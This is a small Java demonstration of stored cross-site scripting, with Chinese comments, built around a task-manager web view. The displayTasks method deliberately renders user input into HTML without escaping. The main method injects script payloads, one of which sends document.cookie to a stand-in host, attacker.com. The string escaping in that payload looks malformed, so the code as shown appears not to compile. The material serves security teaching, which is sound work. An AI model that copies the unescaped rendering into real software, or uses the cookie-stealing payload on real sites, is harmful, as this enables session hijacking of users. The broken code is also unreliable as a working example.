import java.util.ArrayList;
import java.util.List;

// 任务实体类
class Task {
    private String title;
    private String description;

    public Task(String title, String description) {
        this.title = title;
        this.description = description;
    }

    public String getTitle() { return title; }
    public String getDescription() { return description; }
}

// 任务管理类
class TaskManager {
    private List<Task> tasks = new ArrayList<>();

    public void addTask(String title, String description) {
        tasks.add(new Task(title, description));
    }

    public List<Task> getAllTasks() {
        return tasks;
    }
}

// 模拟Web界面
class WebUI {
    private TaskManager taskManager = new TaskManager();

    // 模拟用户提交任务
    public void submitTask(String title, String description) {
        taskManager.addTask(title, description);
    }

    // 显示任务列表（存在漏洞的HTML渲染）
    public String displayTasks() {
        StringBuilder html = new StringBuilder("<div class='tasks'>");
        for (Task task : taskManager.getAllTasks()) {
            html.append("<div class='task'>")
                .append("<h3>").append(task.getTitle()).append("</h3>")
                .append("<p>").append(task.getDescription()).append("</p>")
                .append("</div>");
        }
        html.append("</div>");
        return html.toString();
    }
}

// 模拟攻击场景
public class XSSDemo {
    public static void main(String[] args) {
        WebUI webUI = new WebUI();
        
        // 正常任务提交
        webUI.submitTask("完成报告", "撰写季度财务报告");
        
        // 恶意任务注入
        String maliciousTitle = "<script>alert('XSS攻击成功!'+document.cookie)</script>";
        String maliciousDescription = "查看此任务时已触发XSS攻击<script>document.write('<img src=\\\\"http://attacker.com/steal?cookie=\\\\"+document.cookie \\\");</script>";
        
        webUI.submitTask(maliciousTitle, maliciousDescription);
        
        // 输出任务列表（触发XSS）
        System.out.println("渲染的任务列表HTML：");
        System.out.println(webUI.displayTasks());
    }
}